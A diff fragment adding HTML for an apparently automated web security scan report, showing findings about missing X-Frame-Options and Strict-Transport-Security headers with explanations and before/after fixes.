+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>response.headers[&quot;X-Frame-Options&quot;] = &quot;..appropriate value..&quot;</code>
+                </div>
+            </div>
+            
+        </div>
+        <div style="border:1px solid #e0e0e0;border-left:4px solid #ffc107;
+                    border-radius:8px;padding:16px;margin:12px 0;
+                    background:#fff;box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display:flex;align-items:center;margin-bottom:8px;">
+                <span style="background:#ffc107;color:#fff;padding:4px 12px;
+                             border-radius:4px;font-weight:bold;font-size:0.85em;">
+                    MEDIUM
+                </span>
+                <span style="background:#28a745;color:#fff;padding:2px 8px;border-radius:4px;font-size:0.75em;margin-left:8px;">DAST</span>
+                <span style="margin-left:auto;color:#888;">#16</span>
+            </div>
+            <h3 style="margin:8px 0 4px 0;color:#333;">MISSING_SECURITY_HEADER</h3>
+            <p style="color:#666;margin:4px 0;">
+                📍 <strong>/</strong>
+                
+                → HTTP response
+            </p>
+            <div style="background:#f8f9fa;padding:8px 12px;border-radius:4px;
+                        font-family:monospace;font-size:0.9em;margin:8px 0;">
+                Missing header: Strict-Transport-Security
+            </div>
+            <p><strong>⚠️ Why:</strong> Strict-Transport-Security (HSTS) header is missing. HSTS ensures all communication uses HTTPS, preventing downgrade attacks.</p>
+            <p><strong>✅ Fix:</strong> Add the Strict-Transport-Security header to your responses.</p>
+            
+            <div style="margin-top:8px;">
+                <div style="background:#fff0f0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>Before:</strong> <code># No security headers set</code>
+                </div>
+                <div style="background:#f0fff0;padding:8px;border-radius:4px;margin:4px 0;">
+                    <strong>After:</strong> <code>response.headers[&quot;Strict-Transport-Security&quot;] = &quot;..appropriate value..&quot;</code>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+</body>
+</html>
